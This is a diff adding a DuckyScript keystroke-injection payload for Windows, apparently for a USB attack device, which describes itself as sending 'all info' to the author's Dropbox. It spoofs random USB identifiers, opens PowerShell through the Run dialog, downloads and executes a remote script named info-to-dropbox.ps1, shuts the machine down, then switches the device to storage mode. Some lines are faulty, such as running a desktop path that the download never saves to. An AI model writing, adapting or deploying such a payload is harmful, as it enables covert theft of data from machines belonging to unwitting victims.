@@ -1,0 +1,23 @@
+ATTACKMODE HID VID_RANDOM PID_RANDOM MAN_RANDOM PROD_RANDOM  SERIAL_RANDOM 
+REM Title:all info 
+REM Author:adamg
+REM Description:you will get all info to your dropbox
+REM Target:windows
+REM you need to creative dropbox app and then get url 
+DEFINE ps1 your-link
+WINDOWS r
+DELAY 1000
+STRINGLN powershell 
+DELAY 500
+STRING Invoke-WebRequest -Uri "
+STRING ps1
+STRING "
+STRING ;Invoke-Expression -Command "$env:USERPROFILE\Desktop\info-to-dropbox.ps1"
+STRING ;Start-Sleep -Seconds 120
+STRING ;Set-ExecutionPolicy RemoteSigned
+ENTER 
+STRINGLN shutdown -h
+BUTTON_DEF
+LED_G
+ATTACKMODE STORAGE VID_RANDOM PID_RANDOM MAN_RANDOM PROD_RANDOM  SERIAL_RANDOM 
+END_BUTTON
